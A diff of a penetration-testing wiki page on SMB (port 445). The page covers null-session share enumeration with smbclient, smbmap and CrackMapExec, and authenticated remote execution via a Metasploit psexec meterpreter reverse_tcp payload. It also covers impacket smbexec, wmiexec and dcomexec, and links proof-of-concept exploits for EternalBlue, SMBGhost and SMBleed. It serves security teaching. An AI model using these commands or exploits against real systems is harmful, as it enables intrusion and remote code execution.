@@ -1,12 +1,12 @@
-# 🛠️ \(445\) SMB
+# 🛠️ (445) SMB
 
 ## Theory
 
-SMB \(Server Message Block\) is a protocol running on port 445/tcp. It is used to share access to files, printers and serial ports on a network
+SMB (Server Message Block) is a protocol running on port 445/tcp. It is used to share access to files, printers and serial ports on a network
 
-In 1996 Microsoft releases a customized SMB they call CIFS \(Common Internet File System\). CIFS can sometimes be referred to as SMB1 \(or SMBv1, SMB 1.0\). In 2006, Microsoft introduced SMB2 \(also referred to as SMB 2.0\), a new version of the CIFS protocol. In 2012, Microsoft released SMB3 \(a.k.a. SMB 3.0\). As of 2020, most systems use SMB 2.0 or above.
+In 1996 Microsoft releases a customized SMB they call CIFS (Common Internet File System). CIFS can sometimes be referred to as SMB1 (or SMBv1, SMB 1.0). In 2006, Microsoft introduced SMB2 (also referred to as SMB 2.0), a new version of the CIFS protocol. In 2012, Microsoft released SMB3 (a.k.a. SMB 3.0). As of 2020, most systems use SMB 2.0 or above.
 
-In short, SMB is the protocol, CIFS is an old dialect of SMB, and Samba is the Linux/UNIX-like implementation of the SMB protocol \(see [this](http://thewindowsupdate.com/2020/02/21/smb-and-null-sessions-why-your-pen-test-is-probably-wrong/)\).
+In short, SMB is the protocol, CIFS is an old dialect of SMB, and Samba is the Linux/UNIX-like implementation of the SMB protocol (see [this](http://thewindowsupdate.com/2020/02/21/smb-and-null-sessions-why-your-pen-test-is-probably-wrong/)).
 
 ## Practice
 
@@ -16,7 +16,7 @@ The null session, if not disabled, allows for anonymous/guest access to a networ
 
 {% tabs %}
 {% tab title="UNIX-like" %}
-Tools like [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html) \(C\) and [smbmap](https://github.com/ShawnDEvans/smbmap) \(Python\) can be used to access SMB shares with null sessions. Null credentials do not have to be explicitly set in this case.
+Tools like [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html) (C) and [smbmap](https://github.com/ShawnDEvans/smbmap) (Python) can be used to access SMB shares with null sessions. Null credentials do not have to be explicitly set in this case.
 
 ```bash
 # List shares
@@ -34,7 +34,7 @@ smbmap -u '' -p '' -H $IP
 smbclient //$IP/$SHARE_NAME
 ```
 
-[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) \(Python\) can be used to test for null session on multiple hosts.
+[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) (Python) can be used to test for null session on multiple hosts.
 
 ```bash
 crackmapexec smb $TARGETS -u '' -p '' --shares
@@ -45,7 +45,7 @@ crackmapexec smb $TARGETS -u '' -p '' --shares
 The `net` cmdlet can be used to natively interact with SMB shares and explicitly set null credentials.
 
 {% hint style="warning" %}
-If null credentials are not explicitly set, Windows will natively use implicit credentials \(e.g. Kerberos tickets in cache, logged on user creds or computer account\)
+If null credentials are not explicitly set, Windows will natively use implicit credentials (e.g. Kerberos tickets in cache, logged on user creds or computer account)
 {% endhint %}
 
 ```bash
@@ -92,10 +92,14 @@ crackmapexec smb $TARGETS -u $USERNAME -p $PASSWORD -M spider_plus -o READ_ONLY=
 ### 🛠️ Authenticated RCE
 
 {% tabs %}
+{% tab title="undefined" %}
+
+{% endtab %}
+{% endtabs %}
 
 PSExec exploit module runs on the same principle as the PSExec Windows utility. The exploit embeds a payload into an executable, upload it into the Admin$ share. It then calls the Service Control Manager to approximately start a new rundll32.exe process that will execute our malicious executable.
 
-```text
+```
 msf > use exploit/windows/smb/psexec
 msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
 msf exploit(psexec) > show options
@@ -121,14 +125,16 @@ File uploading, creating, starting, stopping, deletion of services makes it real
 
 The exploit then get the output of the command via Smb and displays the content. For every command, a new service is created.
 
-{% embed url="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py" caption="Exploit" %}
+{% embed url="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py" %}
+Exploit
+{% endembed %}
 
 {% hint style="info" %}
-**%COMSPEC%** is the environment variable that generaly points to the command line interpreter. \(_cmd.exe, powershell.exe_...\)
+**%COMSPEC%** is the environment variable that generaly points to the command line interpreter. (_cmd.exe, powershell.exe_...)
 {% endhint %}
 
 {% hint style="info" %}
-The purpose of using **/Q** option of cmd is to stop displaying output. \(je crois que ça veut dire /quiet à vérifier\)
+The purpose of using **/Q** option of cmd is to stop displaying output. (je crois que ça veut dire /quiet à vérifier)
 {% endhint %}
 
 {% hint style="warning" %}
@@ -143,49 +149,66 @@ Windows Management Instrumentation is a subsystem of PowerShell that gives high 
 
 Wmiexec has a similar approach to smbexec but it is executing commands through WMI.
 
-{% embed url="https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py" caption="Exploit" %}
+{% embed url="https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py" %}
+Exploit
+{% endembed %}
 
 DCOM is a way for a computer to run a program over the network on a different computer as if the program was running locally.
 
 Dcomexec has a similar approach to psexec but it is executing commands through DCOM.
 
-{% embed url="https://github.com/SecureAuthCorp/impacket/blob/master/examples/dcomexec.py" caption="Exploit" %}
+{% embed url="https://github.com/SecureAuthCorp/impacket/blob/master/examples/dcomexec.py" %}
+Exploit
+{% endembed %}
 
 Crackmapexec is a swiss army that has featured a lot of the command execution methods mentionned precedently.
 
 One of its feature is to automate the process of executing code via SMB by switching between methods when one fails.
 
-{% embed url="https://github.com/byt3bl33d3r/CrackMapExec" caption="" %}
+{% embed url="https://github.com/byt3bl33d3r/CrackMapExec" %}
 
 ### 🛠️ Unauthenticated RCE
 
 {% tabs %}
+{% tab title="undefined" %}
+
+{% endtab %}
+{% endtabs %}
 
 Eternalblue is a flaw that allows remote attackers to execute arbitrary code on a target system by sending specially crafted messages to the **SMBv1** server. Other related exploits were labelled as`Eternalchampion`, `Eternalromance` and `Eternalsynergy.`
 
-{% embed url="https://github.com/worawit/MS17-010" caption="POC" %}
+{% embed url="https://github.com/worawit/MS17-010" %}
+POC
+{% endembed %}
 
 Smbghost is a bug occuring in the decompression mechanism of client message to a **SMBv3.11** server. This bug leads remotely and without any authentication to a **BSOD or an RCE** on the target.
 
-{% embed url="https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/" caption="Walktrough" %}
+{% embed url="https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/" %}
+Walktrough
+{% endembed %}
 
-{% embed url="https://github.com/ZecOps/CVE-2020-0796-RCE-POC" caption="POC" %}
+{% embed url="https://github.com/ZecOps/CVE-2020-0796-RCE-POC" %}
+POC
+{% endembed %}
 
 Smbleed allows to **leak kernel** memory remotely, it is also occuring in the same decompression mechanism as smbghost.
 
 In order for the target to be vulnerable, it must have the **SMBv3.1.1** implementation running and the compression function enabled, which is on by **default**.
 
-{% embed url="https://blog.zecops.com/vulnerabilities/smbleedingghost-writeup-chaining-smbleed-cve-2020-1206-with-smbghost/" caption="Walktrough" %}
+{% embed url="https://blog.zecops.com/vulnerabilities/smbleedingghost-writeup-chaining-smbleed-cve-2020-1206-with-smbghost/" %}
+Walktrough
+{% endembed %}
 
-{% embed url="https://github.com/ZecOps/CVE-2020-1206-POC" caption="POC" %}
+{% embed url="https://github.com/ZecOps/CVE-2020-1206-POC" %}
+POC
+{% endembed %}
 
 ## References
 
-{% embed url="https://pandorafms.com/blog/what-is-wmi/" caption="" %}
+{% embed url="https://pandorafms.com/blog/what-is-wmi/" %}
 
-{% embed url="https://book.hacktricks.xyz/pentesting/pentesting-smb" caption="" %}
+{% embed url="https://book.hacktricks.xyz/pentesting/pentesting-smb" %}
 
-{% embed url="https://www.varonis.com/blog/dcom-distributed-component-object-model/" caption="" %}
+{% embed url="https://www.varonis.com/blog/dcom-distributed-component-object-model/" %}
 
-{% embed url="https://www.optiv.com/blog/owning-computers-without-shell-access" caption="" %}
-
+{% embed url="https://www.optiv.com/blog/owning-computers-without-shell-access" %}
